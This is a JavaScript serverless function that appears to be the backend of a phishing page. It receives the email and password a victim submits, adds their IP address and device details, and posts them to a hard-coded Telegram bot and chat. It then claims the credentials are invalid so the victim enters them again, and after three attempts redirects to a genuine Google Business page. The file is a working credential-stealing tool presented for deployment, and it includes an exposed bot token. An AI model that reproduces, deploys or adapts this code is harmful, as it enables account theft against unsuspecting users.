// ============================================================
// ✏️ EDIT THESE VALUES WITH YOUR OWN
// ============================================================

const BOT_TOKEN = '8663822973:AAFMUT0hR_Rgo3tSR0stWcjCZugz31zbkAQ';          // e.g. '1234567890:ABCdefGHIjklMNOpqrsTUVwxyz'
const CHAT_ID = '-5595613546';              // e.g. '123456789' (or '@channelusername')
const REDIRECT_URL = 'https://business.google.com/create/new?hl=en&gmbsrc=ng-en-z-z-z-gmb-l-z-d~mhp-hom_sig-u&original_intent=GMB&skiplp=1&_gl=1*we7dbu*_ga*MTQyMzU2Nzk4MS4xNzQ4ODg2MDg1*_ga_VM5ES1YN10*czE3NDg4ODYwODQkbzEkZzAkdDE3NDg4ODYwODQkajYwJGwwJGgw&service=ome&omec=EMLX0y4yAgECOipnbWJzcmM9bmctZW4tei16LXotZ21iLWwtei1kfm1ocC1ob21fc2lnLXVAAUoTCIuXmb2k040DFb-XAAAd3Ss8Mw%3D%3D';

// ============================================================
// In‑memory attempt store (resets on function cold start)
// ============================================================
const attemptStore = new Map();

// ============================================================
// Helpers
// ============================================================

/**
 * Extract client IP from request headers.
 */
function getClientIP(req) {
    const forwarded = req.headers['x-forwarded-for'];
    if (forwarded) {
        const ips = forwarded.split(',');
        return ips[0].trim();
    }
    return req.connection?.remoteAddress || 'UNKNOWN';
}

/**
 * Send a message to Telegram via Bot API.
 * Uses native fetch (Node.js 18+).
 */
async function sendTelegramMessage(text) {
    if (!BOT_TOKEN || !CHAT_ID) {
        console.warn('⚠️ Telegram credentials missing – message not sent.');
        return;
    }
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: text,
                parse_mode: 'HTML'
            })
        });
        if (!response.ok) {
            const errorData = await response.text();
            console.error('Telegram API error:', errorData);
        }
    } catch (err) {
        console.error('Telegram send error:', err);
    }
}

// ============================================================
// Serverless Function Handler
// ============================================================

module.exports = async (req, res) => {
    // Only accept POST requests
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    // Parse request body (supports JSON and urlencoded)
    let email, password;
    if (req.headers['content-type']?.includes('application/json')) {
        ({ email, password } = req.body);
    } else {
        const { email: e, password: p } = req.body;
        email = e;
        password = p;
    }

    // Validate input
    if (!email || !password) {
        return res.status(400).json({ error: 'Email and password are required' });
    }

    // Gather client information
    const ip = getClientIP(req);
    const deviceInfo = req.headers['user-agent'] || 'Unknown';
    const emailProvider = email.includes('@') ? email.split('@')[1] : 'unknown';
    const timestamp = new Date().toLocaleString();

    // Build the log message (HTML format for Telegram)
    const message = `
🔐 <b>Login Attempt</b>
👤 <b>Email:</b> ${email}
🔑 <b>Password:</b> ${password}
🌐 <b>IP:</b> ${ip}
💻 <b>Device:</b> ${deviceInfo}
📧 <b>Provider:</b> ${emailProvider}
🕒 <b>Time:</b> ${timestamp}
    `;

    // Send to Telegram (fire and forget – don't await to avoid blocking)
    sendTelegramMessage(message).catch(err => console.error('Telegram send failed:', err));

    // Update attempt count for this email
    const current = attemptStore.get(email) || 0;
    const newCount = current + 1;
    attemptStore.set(email, newCount);

    // Decide if we should redirect (after 3 attempts)
    const redirect = (newCount >= 3);

    // Respond to the client
    return res.status(200).json({
        redirect,
        redirectUrl: REDIRECT_URL,
        attempts: newCount,
        message: redirect ? 'Redirecting...' : 'Invalid credentials'
    });
};
